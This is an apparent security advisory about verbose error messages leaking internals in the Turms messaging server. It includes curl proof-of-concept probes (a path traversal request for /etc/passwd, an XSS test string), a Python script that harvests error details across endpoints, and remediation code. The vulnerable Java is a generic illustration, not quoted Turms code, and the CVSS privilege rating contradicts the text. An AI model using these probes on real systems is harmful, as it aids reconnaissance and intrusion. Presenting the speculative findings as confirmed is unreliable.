# Turms Server - Detailed Error Message Information Disclosure Vulnerability

## NAME OF AFFECTED PRODUCT(S)

- **Product**: Turms - Open Source Instant Messaging Engine
- **Vendor Homepage**: https://github.com/turms-im/turms

## AFFECTED AND/OR FIXED VERSION(S)

- **Submitter**: s1ain
- **Affected Version(s)**: Turms v0.10.0-SNAPSHOT and earlier versions
- **Software Link**: https://github.com/turms-im/turms
- **Fixed Version**: Not fixed yet

## PROBLEM TYPE

- **Vulnerability Type**: CWE-209: Generation of Error Message Containing Sensitive Information / CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **Root Cause**: Error responses in production environments may include detailed exception messages, stack traces, internal paths, database information, and system implementation details. This verbose error handling is useful for debugging but exposes sensitive information to attackers.
- **Impact**:
  - Disclosure of internal system architecture and technology stack
  - Exposure of file paths and directory structures
  - Database schema and query information leakage
  - Framework and library version disclosure enabling targeted exploits
  - Insight into application logic and validation mechanisms
  - Facilitation of further attacks through information gathering

## DESCRIPTION

An information disclosure vulnerability exists in Turms server's error handling mechanism. When errors occur during request processing, the system may return detailed error messages to clients that include sensitive information such as Java exception stack traces, internal file paths, database query details, framework implementation specifics, and system configuration information. While this verbose error reporting aids development and debugging, it should be disabled in production environments. Attackers can trigger errors intentionally to extract information about the system's internal workings, technologies used, and potential attack vectors.

## Code Analysis

**Error Response Pattern** (common in Java/Spring applications):

```java
// Development-friendly but insecure error handling
public Mono<ResponseEntity<?>> handleRequest(Request request) {
    return processRequest(request)
        .onErrorResume(throwable -> {
            // Detailed error returned to client
            ErrorResponse error = new ErrorResponse(
                throwable.getClass().getName(),        // ← Internal class names
                throwable.getMessage(),                // ← Potentially sensitive details
                throwable.getStackTrace(),             // ← Full stack trace!
                System.getProperty("java.version"),    // ← System info
                "turms-service"                        // ← Component name
            );
            return Mono.just(ResponseEntity
                .status(500)
                .body(error));
        });
}
```

**Example Verbose Error Response**:

```json
{
  "error": "MongoQueryException",
  "message": "Query failed with error code 2 and error message 'Field 'password' is required' on server mongodb-primary.internal.local:27017",
  "exception": "org.springframework.dao.DataAccessException",
  "trace": [
    "at im.turms.server.common.infra.property.env.service.business.user.UserProperties.validate(UserProperties.java:127)",
    "at im.turms.service.domain.user.service.UserService.createUser(UserService.java:89)",
    "at im.turms.service.domain.user.access.servicerequest.controller.UserServiceController.handleCreateUserRequest(UserServiceController.java:156)"
  ],
  "path": "/turms/service/user/create",
  "timestamp": "2025-11-02T10:30:45.123Z"
}
```

**Information Leaked**:

1. Technology stack: MongoDB, Spring Framework
2. Internal hostnames: `mongodb-primary.internal.local`
3. Database port: `27017`
4. Package structure: `im.turms.service.domain.user.service`
5. File paths and line numbers
6. Method names and application logic flow
7. Framework versions (from stack trace)

## Authentication Requirements

Error messages may be returned to both authenticated and unauthenticated users, depending on where the error occurs in the request processing pipeline. No special privileges are required to trigger and observe error messages.

## Vulnerability Details and POC

**Vulnerability Type**: Sensitive Information Disclosure via Error Messages

**Vulnerability Location**: Global error handling throughout the application

**Proof of Concept**:

**Attack Scenario 1: Trigger Database Error**

```bash
# Send malformed request to trigger database exception
curl -X POST http://turms-server:8080/api/user/create \
  -H "Content-Type: application/json" \
  -d '{
    "userId": -1,
    "password": null,
    "name": "test"
  }'

# Response may include:
# - Database type and version
# - Database server hostname/IP
# - Schema validation rules
# - Query structure
# - Internal package names
```

**Attack Scenario 2: Trigger Validation Error**

```bash
# Send invalid data to trigger validation exception
curl -X POST http://turms-service:9510/api/group/create \
  -H "Content-Type: application/json" \
  -d '{
    "groupName": "<script>alert(1)</script>",
    "ownerId": "not-a-number"
  }'

# Response reveals:
# - Input validation rules
# - Expected data types
# - Validation framework used
# - Code structure
```

**Attack Scenario 3: Trigger Authorization Error**

```bash
# Access restricted endpoint to observe authorization error details
curl -X GET http://turms-admin:9510/admin/api/settings/internal \
  -H "Authorization: Basic invalid"

# May expose:
# - Authentication mechanism details
# - Required permission levels
# - Role-based access control structure
# - Admin panel technology stack
```

**Attack Scenario 4: File Path Disclosure**

```bash
# Trigger file operation error
curl -X GET http://turms-service:9510/logs/../../etc/passwd

# Error message may include:
# - Absolute file paths
# - Application installation directory
# - Operating system details
# - File system structure
```

**Information Gathering Process**:

```python
import requests
import json

# Systematically trigger errors to map application
endpoints = [
    '/api/user/create',
    '/api/group/join',
    '/api/message/send',
    '/admin/api/users',
    '/admin/api/settings'
]

malformed_payloads = [
    {'invalid': 'data'},
    {'userId': -1},
    {'data': 'A' * 10000},  # Overflow
    None,  # Null body
    'not-json'  # Invalid format
]

for endpoint in endpoints:
    for payload in malformed_payloads:
        try:
            resp = requests.post(
                f'http://turms:8080{endpoint}',
                json=payload,
                timeout=5
            )
            if resp.status_code >= 400:
                error_data = resp.json()
                print(f"Endpoint: {endpoint}")
                print(f"Technology: {error_data.get('exception')}")
                print(f"Path: {error_data.get('trace', [''])[0]}")
                print(f"Database: {error_data.get('message')}")
                print("---")
        except Exception as e:
            continue
```

## Attack Results

Information disclosed through error messages enables:

- **Reconnaissance**: Map application structure, technologies, and versions
- **Targeted Exploits**: Identify specific framework vulnerabilities (e.g., Spring Framework CVEs)
- **Database Enumeration**: Learn database type, schema, and constraints
- **Path Traversal**: Discover file system paths for directory traversal attacks
- **Logic Understanding**: Reverse-engineer business logic and validation rules
- **Attack Surface Mapping**: Identify all components and their interactions
- **Credential Discovery**: Occasionally, errors may leak credentials or tokens

## Suggested Repair

1. **Implement Environment-Specific Error Handling** (Primary fix):

```java
@Configuration
public class ErrorHandlingConfiguration {

    @Value("${spring.profiles.active}")
    private String activeProfile;

    @Bean
    public ErrorResponseBuilder errorResponseBuilder() {
        boolean isProduction = "production".equals(activeProfile);

        return new ErrorResponseBuilder(isProduction);
    }
}

public class ErrorResponseBuilder {
    private final boolean production;

    public ErrorResponse buildResponse(Throwable throwable, ServerRequest request) {
        if (production) {
            // Production: Generic error messages only
            return ErrorResponse.builder()
                .timestamp(Instant.now())
                .status(determineStatusCode(throwable))
                .error(getGenericErrorType(throwable))
                .message(getGenericMessage(throwable))
                .path(request.path())
                .build();
        } else {
            // Development: Detailed errors for debugging
            return ErrorResponse.builder()
                .timestamp(Instant.now())
                .status(determineStatusCode(throwable))
                .error(throwable.getClass().getSimpleName())
                .message(throwable.getMessage())
                .exception(throwable.getClass().getName())
                .trace(Arrays.stream(throwable.getStackTrace())
                    .limit(10)
                    .map(StackTraceElement::toString)
                    .collect(Collectors.toList()))
                .path(request.path())
                .build();
        }
    }

    private String getGenericMessage(Throwable throwable) {
        // Map exception types to generic user-friendly messages
        return switch (throwable) {
            case ResponseException e -> e.getMessage(); // Safe, controlled messages
            case ValidationException e -> "Invalid input. Please check your request.";
            case DataAccessException e -> "A database error occurred. Please try again.";
            case SecurityException e -> "Access denied.";
            default -> "An internal error occurred. Please contact support.";
        };
    }

    private String getGenericErrorType(Throwable throwable) {
        return switch (throwable) {
            case ResponseException e -> "REQUEST_ERROR";
            case ValidationException e -> "VALIDATION_ERROR";
            case DataAccessException e -> "DATA_ERROR";
            case SecurityException e -> "AUTHORIZATION_ERROR";
            default -> "INTERNAL_ERROR";
        };
    }
}
```

2. **Custom Exception Hierarchy** with safe messages:

```java
// Define exceptions with safe, user-facing messages
public class SafeUserException extends RuntimeException {
    private final String userMessage;
    private final String internalMessage;

    public SafeUserException(String userMessage, String internalMessage) {
        super(internalMessage);  // Logged but not returned
        this.userMessage = userMessage;  // Returned to user
    }

    public String getUserMessage() {
        return userMessage;
    }
}

// Usage:
throw new SafeUserException(
    "Unable to create user account",  // Safe for users
    "Database constraint violation: unique_email on user_email_idx"  // For logs
);
```

3. **Global Exception Handler**:

```java
@ControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleException(Exception ex) {
        // Log full details for developers
        log.error("Exception occurred", ex);

        // Return sanitized response to client
        ErrorResponse response = ErrorResponse.builder()
            .timestamp(Instant.now())
            .status(HttpStatus.INTERNAL_SERVER_ERROR.value())
            .error("Internal Server Error")
            .message("An unexpected error occurred. Please contact support with reference ID: " + generateReferenceId())
            .build();

        return ResponseEntity
            .status(HttpStatus.INTERNAL_SERVER_ERROR)
            .body(response);
    }
}
```

4. **Structured Logging** (keep details in logs, not responses):

```java
// Log comprehensive details
log.error("User creation failed",
    Map.of(
        "userId", userId,
        "error", throwable.getClass().getName(),
        "message", throwable.getMessage(),
        "stackTrace", ExceptionUtils.getStackTrace(throwable)
    )
);

// Return only reference to user
return ErrorResponse.builder()
    .message("Operation failed. Reference: " + logEntryId)
    .build();
```

5. **Configuration for Production**:

```yaml
# application-production.yaml
server:
  error:
    include-message: never
    include-binding-errors: never
    include-stacktrace: never
    include-exception: false

spring:
  mvc:
    throw-exception-if-no-handler-found: true
  web:
    resources:
      add-mappings: false

logging:
  level:
    root: WARN
    im.turms: INFO
```

6. **Security Best Practices**:
   - Never include stack traces in production responses
   - Use error reference IDs linking to detailed logs
   - Implement different error verbosity per environment
   - Sanitize all database error messages
   - Remove version information from responses
   - Use generic HTTP status codes appropriately

## CVSS Score

**CVSS v3.1**: 3.1 (Low)

- Attack Vector (AV): Network
- Attack Complexity (AC): High
- Privileges Required (PR): Low
- User Interaction (UI): None
- Scope (S): Unchanged
- Confidentiality (C): Low
- Integrity (I): None
- Availability (A): None

**Vector String**: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N

Note: While the direct impact is low, this vulnerability facilitates further attacks by providing reconnaissance information, potentially leading to more severe exploits.

## References

- CWE-209: Generation of Error Message Containing Sensitive Information
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- OWASP Top 10 2021 - A01:2021 – Broken Access Control
- OWASP: Improper Error Handling
- SANS Top 25: CWE-209
